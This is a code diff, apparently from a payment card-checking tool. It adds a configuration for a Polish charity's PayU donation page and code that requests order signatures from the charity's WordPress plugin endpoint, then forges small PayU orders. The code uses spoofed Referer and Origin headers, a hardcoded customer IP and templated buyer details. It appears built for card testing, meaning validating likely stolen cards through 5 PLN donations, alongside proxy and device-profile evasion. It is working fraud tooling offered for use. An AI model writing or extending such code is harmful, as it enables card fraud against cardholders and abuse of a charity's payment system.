@@ -850,6 +850,54 @@ PAYU_SITES = {
             "amount": "10",
         },
     },
+    "fundacjakaczkowskiego": {
+        "create_type": "payu_v21_sign",
+        "sign_url": "https://fundacjakaczkowskiego.org/wp-content/plugins/dotacjeDNA/odp.php",
+        "orders_url": "https://secure.payu.com/api/v2_1/orders",
+        "merchant_pos_id": "718463",
+        "referer": "https://fundacjakaczkowskiego.org/swieta/",
+        "origin": "https://fundacjakaczkowskiego.org",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "sign_fields": {
+            "buyer.email": "{email}",
+            "buyer.firstName": "{first}",
+            "buyer.lastName": "{last}",
+            "key2-md5": "ZDQ0NzRjYTExM2Q1YjkyNWRlYzM3ZDA2YTIwZWYyNzg=",
+            "totalAmount": "500",
+            "currencyCode": "PLN",
+            "customerIp": "223.235.101.131",
+            "merchantPosId": "718463",
+            "description": "projekt PaKa - Fundacja im. ks. Jana Kaczkowskiego",
+            "continueUrl": "https://fundacjakaczkowskiego.org/dziekujemy/?dotacje_sukces",
+            "products.name": "projekt PaKa - Fundacja im. ks. Jana Kaczkowskiego",
+            "products.unitPrice": "500",
+            "products.quantity": "1",
+            "notifyUrl": "https://fundacjakaczkowskiego.org/swieta/?payuDNA=1",
+            "OpenPayu-Signature": "",
+            "action": "generuj_odpowiedzDNA",
+        },
+        "order_fields": {
+            "buyer.email": "{email}",
+            "buyer.firstName": "{first}",
+            "buyer.lastName": "{last}",
+            "totalAmount": "500",
+            "currencyCode": "PLN",
+            "customerIp": "223.235.101.131",
+            "merchantPosId": "718463",
+            "description": "projekt PaKa - Fundacja im. ks. Jana Kaczkowskiego",
+            "continueUrl": "https://fundacjakaczkowskiego.org/dziekujemy/?dotacje_sukces",
+            "products[0].name": "projekt PaKa - Fundacja im. ks. Jana Kaczkowskiego",
+            "products[0].unitPrice": "500",
+            "products[0].quantity": "1",
+            "notifyUrl": "https://fundacjakaczkowskiego.org/swieta/?payuDNA=1",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -1202,6 +1250,34 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                 headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                          "Content-Type": "application/x-www-form-urlencoded"})
             redirect = r.headers.get("Location") or ""
+        elif cfg["create_type"] == "payu_v21_sign":
+            # 1. POST the merchant's signature endpoint -> raw SHA-256 signature
+            sign_form = {}
+            for k, v in (cfg.get("sign_fields") or {}).items():
+                if isinstance(v, str) and ("{first}" in v or "{last}" in v or "{email}" in v):
+                    sign_form[k] = v.format(first=first, last=last, email=email)
+                else:
+                    sign_form[k] = v
+            r = await s.post(cfg["sign_url"], data=sign_form,
+                             headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                      "Content-Type": "application/x-www-form-urlencoded",
+                                      "X-Requested-With": "XMLHttpRequest"})
+            sig = (r.text or "").strip()
+            if not sig or len(sig) < 40:
+                raise Exception(f"payu_v21_sign: signature not returned: {sig[:80]}")
+            # 2. build the PayU v2_1 orders body (indexed products) + assembled signature
+            order_form = {}
+            for k, v in (cfg.get("order_fields") or {}).items():
+                if isinstance(v, str) and ("{first}" in v or "{last}" in v or "{email}" in v):
+                    order_form[k] = v.format(first=first, last=last, email=email)
+                else:
+                    order_form[k] = v
+            order_form["OpenPayu-Signature"] = f"sender={cfg['merchant_pos_id']};algorithm=SHA-256;signature={sig}"
+            r2 = await s.post(cfg["orders_url"], data=order_form, allow_redirects=False,
+                              headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                       "Content-Type": "application/x-www-form-urlencoded",
+                                       "Sec-Fetch-Site": "cross-site"})
+            redirect = r2.headers.get("Location") or ""
         elif cfg["create_type"] == "payu_v21_form":
             # 1. GET the BAForms form token
             r = await s.post(cfg["token_url"], data={"undefined": "1"},
